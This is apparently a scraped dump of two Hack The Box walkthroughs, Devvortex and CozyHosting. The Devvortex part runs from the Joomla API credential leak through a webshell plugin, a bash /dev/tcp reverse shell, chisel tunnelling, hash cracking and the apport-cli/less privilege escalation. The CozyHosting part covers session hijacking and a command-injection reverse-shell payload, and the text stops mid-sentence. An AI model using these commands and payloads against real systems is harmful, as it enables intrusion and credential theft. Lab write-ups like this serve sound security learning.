sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Host is up (0.075s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=1/27%OT=22%CT=1%CU=33394%PV=Y%DS=2%DC=I%G=Y%TM=65B4 OS:F143%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A) OS:OPS(O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53C OS:ST11NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88) OS:ECN(R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+% OS:F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T OS:5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A= OS:Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF OS:=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40 OS:%CD=S) To be thorough, I also did a scan over the common UDP ports:
sudo nmap -sUV -T4 -F --version-intensity 0 -oN nmap/port-scan-udp.txt $RADDR &#x261d;&#xfe0f; UDP scans take quite a bit longer, so I limit it to only common ports
All 100 scanned ports on devvortex.htb (10.10.11.242) are in ignored states. Not shown: 74 closed udp ports (port-unreach), 26 open|filtered udp ports (no-response) To investigate a little further, I ran a script scan over the TCP ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://devvortex.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=devvortex.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR OK, so it&rsquo;s running nginx 1.18.0. It&rsquo;s all pretty typical.
Next I performed vhost enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 60 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results from the vhost scan (devvortex is not in the wordlist - no surprise there). Now I’ll check for subdomains of http://devvortex.htb:
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 60 -o fuzzing/subdomain-$DOMAIN.md -of md -timeout 4 -ic -ac -v Ok, so dev.devvortex.htb exists. That&rsquo;s notable! I&rsquo;ll add it to my /etc/hosts file:
echo &#34;$RADDR dev.$DOMAIN&#34; | sudo tee -a /etc/hosts So far, I know about devvortex.htb and dev.devvortex.htb. I&rsquo;ll do directory enumeration over those two next. First up, devvortex.htb:
&#x1f914; To be honest, I still don&rsquo;t have a favourite directory enumeration tool:
Often, I favor ffuf for directory enumeration, for its extensive options. Other times, I like the simplicity of gobuster. And if I want to enumerate very deeply, I&rsquo;ll use feroxbuster.
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; OUTPUT=&#34;fuzzing/directory&#34; # This is what I often use: # ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT.json&#34; -of json -e php,asp,js,html -timeout 4 -v gobuster dir -w $WLIST -u http://$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;$OUTPUT-$DOMAIN.txt&#34; \\ --no-error Directory enumeration against http://devvortex.htb/ gave the following:
Next, I&rsquo;ll do directory enumeration on the subdomain, dev.devvortex.htb:
gobuster dir -w $WLIST -u http://dev.$DOMAIN \\ --random-agent -t 10 --timeout 5s -f -e \\ --status-codes-blacklist 400,401,402,403,404,405 \\ --output &#34;$OUTPUT-dev.$DOMAIN.txt&#34; \\ --no-error Directory enumeration against http://dev.devvortex.htb/ gave the following:
Very interesting! Two things that stand out right away are:
the /administrator page. I should check this out right away. the 406 status of /api. That&rsquo;s a bit of an odd status. Perhaps I was just using the wrong HTTP verb? Just like I did in Gopher, I&rsquo;ll try looping through the HTTP verbs Navigating to the /administrator page immediately reveals the CMS that is used for this website, Joomla!:
for T in \`echo &#34;GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH&#34; | sed &#39;s/,//g&#39;\`; do echo &#34;\\n\\nTrying $T\\n&#34;; curl -X $T --max-time 3 http://dev.devvortex.htb/api; done GET and POST each resulted in a 301 Moved Permanently status. The rest were all 405 Not Allowed. So I think it&rsquo;s safe to say the API is listening for only GET and POST. I&rsquo;ll try the same url but with a trailing slash this time:
for T in \`echo &#34;GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH&#34; | sed &#39;s/,//g&#39;\`; do echo &#34;\\n\\nTrying $T\\n&#34;; curl -X $T --max-time 3 http://dev.devvortex.htb/api/; done Trying GET {&#34;errors&#34;:[{&#34;title&#34;:&#34;Resource not found&#34;,&#34;code&#34;:404}]} Trying POST {&#34;errors&#34;:[{&#34;title&#34;:&#34;Resource not found&#34;,&#34;code&#34;:404}]} Cool, it sent back a JSON response. Maybe there&rsquo;s something there? I&rsquo;ll try a bit more specific of a search using ffuf:
ffuf -w $WLIST:FUZZ -u http://dev.$DOMAIN/api/FUZZ -t 80 --recursion --recursion-depth 2 -c -o &#34;$OUTPUT-dev.$DOMAIN-api.json&#34; -of json -e php,asp,js,html -timeout 4 -v -fc 403 Progress on this enumeration had slowed to a crawl, so I decided to change directions: which version of Joomla am I looking at? If I knew what version of Joomla CMS this site was using, I&rsquo;d have a pretty good idea of some &ldquo;expected&rdquo; / &ldquo;positive&rdquo; results to check out while enumerating the API.
Fingerprinting Joomla My first (and most obvious step) to attempt to fingerprint the Joomla version was to check the page header and footer for any details. Nope, nothing written there. Next easy step is to check Wappalyzer, which I use as a browser extension. It detected that Joomla is the CMS, but did not specify the version it was running:
Then I tried running whatweb against the dev.devvortex.htb/administrator page:
Again, it indicates Joomla is being used, but not what version it&rsquo;s running. Hmm&hellip; Maybe someone has made a tool for doing this? A cursory search on Github revealed a tool called CMSeek that claims to do exactly what I need. I grabbed set up a python venv, grabbed the code ( and installed requirements), then ran it:
python3 CMSeeK/cmseek.py -u dev.devvortex.htb Bingo! It looks like the site is running Joomla version 4.2.6. I&rsquo;ll toss that into searchsploit and see if anything obvious appears.
While searchsploit joomla 4.2.6 yielded no results, a more general search did have some results:
A couple of these look like they might be usable.
CVE-2023-23742 I&rsquo;m most interested in trying the exploit listed at the bottom, with ID 51334. searchsploit -x 51334 shows the ruby source code for this exploit. This is an exploit submitted for CVE-2023-23752. A quick read through the source code reveals that it is meant to pull specific data out of the API! Nice! &#x1f609; All of them work by forming a specific request to the API in this form:
{root_url}/api/index.php/v1/{information_to_grab}/application?public=true where {information_to_grab} could be config or users.
curl -v http://dev.devvortex.htb/api/index.php/v1/config/application?public=true &#x1f602; Oh wow - there&rsquo;s a credential sitting right there! Fingers crossed it&rsquo;s still valid. Also in this config dump, there is a little bit of information about the CMS&rsquo;s database. Could be useful.
lewis : P4ntherg0t1n5r3c0n## I&rsquo;ll also check for a list of users:
curl -v http://dev.devvortex.htb/api/index.php/v1/users?public=true Wonderful - Not only does this support the guess that lewis is a valid user, this gives some other info about them (such as their group membership in Super Users, and shows that there is another user, logan (for whom we don&rsquo;t have a password)
FOOTHOLD Administrator Dashboard So what are we waiting for? Let&rsquo;s try logging in as lewis!
&#x1f44d; Perfect - lewis has access to the /administrator dashboard. Unfortunately, the same credentials do not work for an SSH login.
It doesn&rsquo;t look like there is any way to directly open up some kind of terminal on the server using Joomla - that would be a bit easy. However, I do see a way to upload Extensions for the website. The way I see it, there are at least two likely paths forward:
Perhaps I could write or find a malicious extension and load it onto the site? This is running with PHP; maybe there is a way to upload a webshell for it? Maybe I can use the administrator dashboard to downgrade the security on the site, making upload of an existing webshell more viable? The first option seems more direct, so I&rsquo;ll investigate adding some kind of webshell extension into the site.
Personally, I don&rsquo;t have any experience writing extensions for Joomla, so I did some searching to see if someone has accomplished this already. Of course, somebody has already made (seemingly) the perfect tool for the job: joomla-webshell-plugin by p0dalirius. The author even kindly provided a link to an official guide by Joomla on how to write modules.
Cloned the repo and installed it onto the website from the Joomla administrator dashboard: System &gt; Install - Extensions &gt; Upload Package File then choosing the file dist/joomla-webshell-plugin-1.1.0.zip. Joomla indicated the extension installed successfully, so I tried it out:
curl -X POST &#39;http://dev.devvortex.htb/modules/mod_webshell/mod_webshell.php&#39; --data &#34;action=exec&amp;cmd=id&#34; {&#34;stdout&#34;:&#34;uid=33(www-data) gid=33(www-data) groups=33(www-data)\\n&#34;,&#34;stderr&#34;:&#34;&#34;,&#34;exec&#34;:&#34;id&#34;} &#x1f60e; Excellent! We have RCE. Let&rsquo;s try to turn this webshell into a reverse shell.
# Open a firewall port sudo ufw allow from $RADDR to any port 4444 proto tcp # Start the listener socat -d TCP-LISTEN:4444 STDOUT Then, using the webshell I&rsquo;ll attempt to get the target to connect to my socat listener. I&rsquo;m using the console.py utility included in joomla-webshell-plugin:
&#x261d;&#xfe0f; The above is a base-64 encoded version of a simple bash shell: bash -i &gt;&amp; /dev/tcp/10.10.14.6/4444 0&gt;&amp;1 . If I were to use curl instead of console.py, I&rsquo;d probably have made a request using a URL-encoded bash shell instead.
After a couple seconds, the target successfully connected back to my socat listener:
USER FLAG www-data First things first, let&rsquo;s do some simple enumeration of the system. What notable users exist?
id &amp;&amp; cat /etc/passwd | grep -v nologin | grep -v /bin/false root:x:0:0:root:/root:/bin/bash sync:x:4:65534:sync:/bin:/bin/sync logan:x:1000:1000:,,,:/home/logan:/bin/bash Aha, there&rsquo;s the significance of &ldquo;logan&rdquo;; lewis is the website administrator but logan is the human user on the server.
# Find where www-data has write permissions find / -user $USER 2&gt;/dev/null | grep -v &#39;^\\(/sys\\|/proc\\|/run\\)&#39; Output is omitted for clarity, but the gist is that www-data has write permissions to /var/www/devvortex.htb, /var/www/dev.devvortex.htb, and /etc/nginx. What about notable software?
which nc netcat socat curl wget python python3 perl php tmux Turns out the box has all of the above except for socat.
What listening services are running?
netstat -tulpn | grep LISTEN We already knew about SSH and HTTP from the initial nmap scans, but now we also know DNS and MySQL are listening. Is cron running anything notable?
crontab -l ; cat /etc/crontab ; ls -laR /etc/cron No, nothing interesting there. Let&rsquo;s take a quick look for SUID/SGID executables, and for files with extra capabilities:
find / -type f \\( -perm -4000 -o -perm -2000 \\) -exec ls -l {} \\; 2&gt;/dev/null | grep -v &#39;/proc&#39;; getcap -r / 2&gt;/dev/null Also nothing out of the ordinary in there. Let&rsquo;s also check to see if the credential for logan is sitting around somewhere obvious:
find / -maxdepth 2 -type f ! -path &#39;/proc/*&#39; ! -path &#39;/dev/*&#39; -exec grep &#34;logan&#34; {} + Nope! In the absence of any other leads, I&rsquo;ll take a look at the MySQL database.
MySQL Using MySQL is trivial when you already have a robust terminal like SSH. But right now, all I have is this simple reverse shell, with no interactive terminal capabilities. As a result, I can&rsquo;t do things like open files in a pager, or connect to the database
single one-liner queries would work, but are a little tedious to use.
To get around this limitation, I&rsquo;ll open up a socks5 proxy from the target machine. For this, I&rsquo;ll use chisel. But first, I need to get chisel onto the target. I&rsquo;ll stand up a python http server from my attacker machine to host my standard toolbox, which contains chisel:
# Open up a firewall port for the http server and for chisel server sudo ufw allow from $RADDR to any port 4444,8000,9999 proto tcp cd ~/MyToolbox # Run chisel and background it (or just use another terminal window/tab) ./chisel server --port 9999 --reverse --key MyS3cr3tK3y &amp; # Start the webserver to serve the Toolbox to the target python3 -m http.server 8000 ☝️ Note: I already have proxychains installed on my attacker machine, and my /etc/proxychains.conf file ends with:
... socks5 127.0.0.1 1080 #socks4 127.0.0.1 9050 Then, on the target box:
# Set up a hidden directory in tmp to download tools to mkdir -p /tmp/.Tools cd /tmp/.Tools # Download each tool that might be useful, such as chisel wget http://10.10.14.3:8000/chisel &amp;&amp; chmod 755 chisel # Form the proxy connection and background it ./chisel client 10.10.14.3:9999 R:1080:socks &amp; Back on my attacker box, I like to test the proxy connection by doing a banner-grab of the python webserver hosting my toolbox. By doing this, we&rsquo;ve tested the whole round-trip connection (attacker -&gt; target -&gt; attacker):
proxychains whatweb http://10.10.14.3:8000 Success! Now to move on to the actual task - checking out the MySQL database. I&rsquo;ll connect from my attacker box via the proxy:
# First, try anonymous proxychains mysql -h localhost # nope # Next, try root/root proxychains mysql -h localhost -u root -p # also nope Hmm, looks like there might be a password on the database. I checked env and there was not a password for the database connection in plain sight. Since it&rsquo;s not an environment variable, there&rsquo;s a good chance a password is sitting in one of the config files for the server. Actually, /var/www/dev.devvortex.htb/configuration.php looks quite promising:
Yep! There it is. I feel a little stupid, not having tried the obvious: lewis / P4ntherg0t1n5r3c0n## I think this config file is the very same one that I leaked earlier using the CVE. Woops! &#x1f605;
Wait, what? It still won&rsquo;t authenticate? I&rsquo;m reasonably sure that is the correct credential.
Ah, I see. Looks like it didn&rsquo;t accept localhost but 127.0.0.1 is fine &#x1f643;
Take a quick look at the database and see what might be usable:
show databases; # we&#39;re expecting &#39;joomla&#39;, which indeed is present use joomla; show tables; # look for a users table describe sd4fg_users; Now query that table and see what the passwords are:
Excellent, we already have lewis&rsquo;s password, but now we also have the password hash for logan:
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 Also, we already know that this is hashed and salted using blowfish, but just for good measure I&rsquo;ll run it through name-that-hash and see what it says.
Now I just need to attempt to crack that hash to recover logan&rsquo;s password. I put the hash into a text file in the expected format and attempt to crack it using john:
Super! We now have one more credential to try.
logan : tequieromucho And since logan is a user (with a login) on the target machine, there&rsquo;s a solid chance that we can log in using SSH now
&#x1f525; Success! Now just cat ~/user.txt for the points.
ROOT FLAG Finding the PE Vector There&rsquo;s one thing I like to check as soon as I&rsquo;m logged onto a linux box as an low-privileged user for the first time, especially on Easy boxes:
# What can this user run as sudo? sudo -l In my experience, at least on Easy boxes, this leads directly to privilege escalation. This was the result when running it as logan:
&#x261d;&#xfe0f; This is also a useful check to perform for a very easy privesc method: path abuse.
Alright, so logan is able to sudo /usr/bin/apport-cli. If you use Ubuntu often, you&rsquo;ll immediately recognize the name Apport: it is the utility that reports crashes when they occur, usually to aid developers in fixing bugs. Perhaps you&rsquo;ve seen a window like this:
This system has a console-only interface too, apport-cli. It wasn&rsquo;t immediately obvious to me how apport-cli could be used to gain root, so I did a quick search for &ldquo;apport-cli privilege escalation&rdquo; and was presented with a whole slew of articles all pointing towards one vulnerability: CVE-2023-1326.
When a program crashes, Apport may detect the crash and place a .crash file into /var/crash. By using apport-cli you have the ability to review and submit these .crash files manually by using the -c option. But how does it open the crash report for review? Like many other CLI programs, it simply invokes the default pager, most commonly less.
&#x1f4bb; Savvy readers will already see where I&rsquo;m going with this. This is a surprisingly common privilege escalation on Easy boxes. In fact, I already wrote about it in my walkthrough for Sau. Also, there&rsquo;s a succinct description of it as the very first entry of this GTFObins page.
When the terminal window is too small to display the full contents of a document, less opens the content in a scrollable pane. And at the bottom of the screen, there is a &ldquo;convenience&rdquo; feature that allows the user to issue shell commands. The trick here is simple:
Shrink your terminal window to a size that is too small to display the entire contents of a file. Open the file using less, as a privileged process Spawn a root shell by typing :!/bin/bash in the command line at the bottom of the less pane. Forging a Crash Report We already know that there should be a .crash file in /var/crash to open it in apport-cli. Thankfully, this directory is writable by logan! Naturally, I&rsquo;ll try the easiest thing first - creating a bogus crash report then reading it:
# make a fake crash report echo &#34;something happened&#34; &gt; /var/crash/test.crash # attempt to review the report to open it sudo /usr/bin/apport-cli -c /var/crash/rest.crash Hmm, ok. But how can I easily create a &ldquo;valid&rdquo; problem report? My first reaction was to simply write a program that will crash, thereby causing apport to drop a .crash file into /var/crash. With a little coaxing, I got ChatGPT to spit out some relevant code:
import signal def crash_demo(signum, frame): raise Exception(&#34;Simulated crash&#34;) signal.signal(signal.SIGSEGV, crash_demo) raise Exception(&#34;This is a deliberate crash for demonstration purposes.&#34;) The program crashed, but unfortunately did not place a .crash file in /var/crash. What about using C instead?
#include &lt;stdio.h&gt; int main() { int *ptr = NULL; *ptr = 42; // Intentionally segfault return 0; } After compiling that with gcc -o crashme crashme.c, I tried running it. Same result: no .crash file appeared.
The next stop was to do a little research about the format of a &ldquo;valid&rdquo; crash report. The answer to a question posed on StackOverflow pointed me in the right direction.
I should use colon-separated key-value pairs in the crash report. Two fields to start with are Package and ExecutablePath. I created a file /var/crash/crashme.crash with the following contents:
Package: Python3.8.10 ExecutablePath: /usr/bin/python3 Then tried again to open the file:
A different error this time! That&rsquo;s good news. It looks like it&rsquo;s just missing the &ldquo;ProblemType&rdquo; field. Also, I should add a bunch of junk information inside the report so that the contents are necessarily larger than the less window displaying the report. These are the updated contents:
Package: Python3.8.10 ExecutablePath: /usr/bin/python3 ProblemType: deathloop Symptom: a bunch of stuff happened and then I don&#39;t know what else could have happened! Then I couldn&#39;t open my email. Then I got stuck in this loop! [...repeated 100 times...] Then I got stuck in this loop! Then attempt again to open up the crash report:
Wonderful! Looks like it accepted the format of my bogus crash report. Select V to view the report (and shrink down the terminal window, just in case). Just as I had hoped, there is a line at the bottom that can be used to execute shell commands:
This opens up a new bash process running as root:
Not too bad! Now I can simply cat out the flag for the remainder of the box&rsquo;s points &#x1f370;
LESSONS LEARNED Attacker Check for CVEs early and often. As soon as you fingerprint the target (or identify the version of an application that might be a PE vector), do a very quick search online and see if any CVEs apply. Often enough, this will point you in the right direction and prevent you from re-inventing the wheel. If you&rsquo;re lucky, there will even be some PoC code, saving even more time.
Credential re-use always comes first: When trying to access the MySQL database, I neglected to check credential re-use as the very first thing. Instead, I got myself off on a bit of a tangent trying to obtain the Joomla configuration files that would contain the database credentials. No harm done; just a little time wasted.
Don&rsquo;t try to outsmart an easy box. Even though it turned out that I should have checked for credential re-use, I wasted a little time trying to find the database credentials by using a recursive grep of all the server&rsquo;s files. It took me a few minutes before I realized configuration.php was sitting right in front of me. To add salt to the wound, I had completely forgot that I already leaked that file by using CVE-2023-23742 &#x1f926;&zwj;&#x2642;&#xfe0f;
Defender Whenever possible, automatic update. I get it: website administrators can sometimes be overworked and under-resourced. There is no way that they can also be staying on top of the latest threat intelligence. Thankfully, this task can be somewhat crowdsourced by simply setting up automatic updates of the server. Ideally, within a day or two of CVE-2023-23742 appearing, the Joomla CMS should have been updated.
Avoid credential re-use. There is no good reason to justify why lewis re-used their credential for the database. It&rsquo;s just sloppy and lazy, making the attacker&rsquo;s job substantially easier.
Least-privilege: still relevant! It&rsquo;s a good start that logan didn&rsquo;t have full root access to the machine, but even by granting root sudo rights to apport-cli, an obvious privilege escalation opportunity was created. Why not just set up the root user with a separate password? That way, programs like apport-cli can&rsquo;t be abused so trivially.
Password rules can sometimes be good. While the world is moving away from using passwords for everything, they won&rsquo;t completely disappear for a long time: passwords can be very convenient in some cases. So, why not tighten security a little bit by using some password rules? In this box, logan&rsquo;s password was a concatenation of two spanish words. Perhaps this should have violated a password composition policy?
`,url:"https://4wayhandshake.github.io/walkthrough/devvortex/"},"https://4wayhandshake.github.io/walkthrough/cozyhosting/":{title:"CozyHosting",tags:["Spring Boot","Session Hijacking","Command Injection","PostgreSQL","Password Cracking"],categories:["Walkthrough","HTB","Linux","Easy"],content:`INTRODUCTION Cozyhosting was released as the penultimate box of HTB&rsquo;s season II &ldquo;Hackers Clash&rdquo;. The box is set up as a server hosting a Spring Boot application, with the challenge revolving around exploiting the web app to gain an initial foothold. The box uses common vulnerabilities and is definitely one of the easier boxes of the season.
Recon for Cozyhosting was important. A little bit of enumeration will yield a token with which you can hijack an existing session, giving you access to an admin dashboard. The admin dashboard has functionality inside it that can lead directly into a foothold - the only trick is in realizing what&rsquo;s in front of you (Burp will be very useful here). Also, knowing a few tricks for escaping strings for shell command injection might help &#x1f609;.
Keeping in mind how spring boot works will point you in the right direction for achieving the user flag: theres a file necessary for the server to run that leads, indirectly, to a couple password hashes. After a little hash cracking (don&rsquo;t worry, it&rsquo;s fast), you&rsquo;ll finally have SSH access to the box. Once you have ssh open, the privesc to root should be very, very obvious. Don&rsquo;t overthink the root flag - once you see it, just check GTFObins and do what it says.
RECON nmap scans For this box, I&rsquo;m running the same enumeration strategy as the previous boxes in the Open Beta Season II. I set up a directory for the box, with a nmap subdirectory. Then set $RADDR to my target machine&rsquo;s IP, and scanned it with a simple but broad port scan:
sudo nmap -p- -O --min-rate 1000 -oN nmap/port-scan-tcp.txt $RADDR Nmap scan report for 10.10.11.230 Host is up (0.17s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE 22/tcp open ssh 80/tcp open http Is this one entirely web? To investigate a little further, I ran a script scan over the ports I just found:
TCPPORTS=\`grep &#34;^[0-9]\\+/tcp&#34; nmap/port-scan-tcp.txt | sed &#39;s/^\\([0-9]\\+\\)\\/tcp.*/\\1/g&#39; | tr &#39;\\n&#39; &#39;,&#39; | sed &#39;s/,$//g&#39;\` sudo nmap -sV -sC -n -Pn -p$TCPPORTS -oN nmap/script-scan-tcp.txt $RADDR PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 43:56:bc:a7:f2:ec:46:dd:c1:0f:83:30:4c:2c:aa:a8 (ECDSA) |_ 256 6f:7a:6c:3f:a6:8d:e2:75:95:d4:7b:71:ac:4f:7e:42 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://cozyhosting.htb Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Webserver Strategy Noting the redirect from the nmap scan, I added download.htb to /etc/hosts and did banner grabbing on that domain:
DOMAIN=cozyhosting.htb echo &#34;$RADDR $DOMAIN&#34; | sudo tee -a /etc/hosts ☝️ I use tee instead of the append operator &gt;&gt; so that I don&rsquo;t accidentally blow away my /etc/hosts file with a typo of &gt; when I meant to write &gt;&gt;.
whatweb $RADDR &amp;&amp; curl -IL http://$RADDR Next I performed vhost and subdomain enumeration:
WLIST=&#34;/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt&#34; ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.htb&#34; -c -t 80 -o fuzzing/vhost-root.md -of md -timeout 4 -ic -ac -v No results. That&rsquo;s fine though - it&rsquo;s not as if &ldquo;cozyhosting&rdquo; is in my wordlist. Now I&rsquo;ll check for subdomains of cozyhosting.htb
ffuf -w $WLIST -u http://$RADDR/ -H &#34;Host: FUZZ.$DOMAIN&#34; -c -t 80 -o fuzzing/vhost-cozyhosting.md -of md -timeout 4 -ic -ac -v No results from that, either. I&rsquo;ll move on to directory enumeration on http://cozyhosting.htb:
Note: When I first ran directory enumeration, I got lots of nuisance HTTP status 200 results, each of size 2066B - so those are filtered out in the following ffuf command
WLIST=&#34;/usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt&#34; ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 --recursion --recursion-depth 2 -c -o ffuf-directories-root -of json -e php,asp,js,html -timeout 4 -v Directory enumeration against http://cozyhosting.htb/ gave the following:
I tried accessing /admin, just to see what was there. It just leads to a page that is not useful. So then I tried a larger wordlist:
WLIST=/usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt ffuf -w $WLIST:FUZZ -u http://$DOMAIN/FUZZ -t 80 -c -timeout 4 -v This didn&rsquo;t produce any usable new results, either. It seems like many pages that have a URL-encoded &ldquo;.&rdquo; match to a 1-word page, but these don&rsquo;t seem useful in any way. I&rsquo;ll try a couple more tools for directory enumeration. First, I&rsquo;ll try dirsearch:
dirsearch -t 60 -u http://cozyhosting.htb Oh, nice! There is a directory for /actuator. This is a Java Spring Boot tool for helping add webserver features; it does things like logging and monitoring. If I can access it unauthenticated, this is a fairly serious misconfiguration and a very likely path forward.
Yep! I can access it unauthenticated. That /actuator/env looks juicy: I&rsquo;ll check that out first. Clearly this is pointing to http://localhost:8080/actuator/env, but as shown in the top result, all of these pages are also publicly available under http://cozyhosting/actuator.
I get the impression that /actuator/env actually has most of its values hidden or censored. There doesn&rsquo;t seem to be anything here that is useful. I&rsquo;ll check out /actuator/sessions instead:
&#x1f601; Nice! We can just swipe that session ID and take over the session open as kanderson. While exploring the website a bit and proxying my requests through Burp, I noticed that each request includes a JSESSIONID cookie. To see if kanderson is an &ldquo;admin&rdquo; I&rsquo;ll try using their cookie while making a request to the /admin page:
It worked like a charm!
&#x1f606; Well, that was pretty easy! I&rsquo;ll take a look around the admin page. Already, I see that each host is marked as Patched / Pending ? Not patched. This must be what the index page was alluding to, from their description of each tier of service shown below:
On the admin page, there is an odd message. Is this just a typo? Usually only the public key gets put into the .ssh/authorized_keys file:
This &ldquo;include host into automatic patching&rdquo; includes a small form where where the admin user can specify a host and a username:
&lt;form action=&#34;/executessh&#34; method=&#34;post&#34;&gt; &lt;div class=&#34;row mb-3&#34;&gt; &lt;label class=&#34;col-sm-2 col-form-label&#34;&gt;Connection settings&lt;/label&gt; &lt;div class=&#34;col-sm-10&#34;&gt; &lt;div class=&#34;form-floating mb-3&#34;&gt; &lt;input name=&#34;host&#34; class=&#34;form-control&#34; id=&#34;host&#34; placeholder=&#34;example.com&#34;&gt; &lt;label for=&#34;host&#34;&gt;Hostname&lt;/label&gt; &lt;/div&gt; &lt;div class=&#34;form-floating mb-3&#34;&gt; &lt;input name=&#34;username&#34; class=&#34;form-control&#34; id=&#34;username&#34; placeholder=&#34;user&#34;&gt; &lt;label for=&#34;username&#34;&gt;Username&lt;/label&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;text-center&#34;&gt; &lt;button type=&#34;submit&#34; class=&#34;btn btn-primary&#34;&gt;Submit&lt;/button&gt; &lt;button type=&#34;reset&#34; class=&#34;btn btn-secondary&#34;&gt;Reset&lt;/button&gt; &lt;/div&gt; &lt;/form&gt; FOOTHOLD Automatic Patching Form I tried filling out this form in a few different ways, using the kanderson session ID each time. First, I tried one of the hosts that were listed on the admin page:
Invalid hostname, eh? Ok. I&rsquo;ll instead try the ID number beside it:
That translates to 0.0.10.84? Ohh&hellip; I think I see what&rsquo;s going on: 10*256+84 = 2644. Yep! &#x1f913; It&rsquo;s an IPv4 translation to a 4-digit base-256 number. Here&rsquo;s a more trivial case, also showing that this will try to connect to any numeric address:
Taking this one step further, the localhost address would be 127 * 256^3 + 1 = 2,130,706,433:
&ldquo;Host key verification failed&rdquo;. Well, at least that&rsquo;s something different. It probably means that it&rsquo;s a valid host. Assuming the host is fine, I&rsquo;ll try messing around with the username parameter instead. I&rsquo;ll try a blank username:
Very interesting! The server must be issuing a command in the form ssh -i &lt;keyfile&gt; &lt;username&gt;@&lt;host&gt; &lt;command&gt;. So when I provided a blank username, I get the ssh error text. That&rsquo;s fine though - there&rsquo;s a good chance this could lead to command injection. How about, instead of providing a username, I&rsquo;ll just pop in a shell command:
Perfect! That proves that command injection is possible. I&rsquo;ll try reading a file instead:
Username can&rsquo;t contain whitespaces, eh? Ok, no problem - there&rsquo;s plenty of tricks for that:
Excellent - that&rsquo;s the first line of /etc/passwd that got dumped into the error text. For context, there are many more methods for bypassing spaces listed on this Hacktricks page. I&rsquo;ll try a reverse shell next:
sudo ufw allow from $RADDR to any port 4444 proto tcp socat -d -d TCP-LISTEN:4444 STDOUT And I&rsquo;ll use a base64-encoded bash reverse shell:
{echo,&#34;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjEzLzQ0NDQgMD4mMQ==&#34;|base64,-d|bash,-i} It&rsquo;s still complaining about whitespace. Must be because of the + characters inside the payload, which is a URL-encoded space character. I&rsquo;ll double-encode the base-64 payload this time:
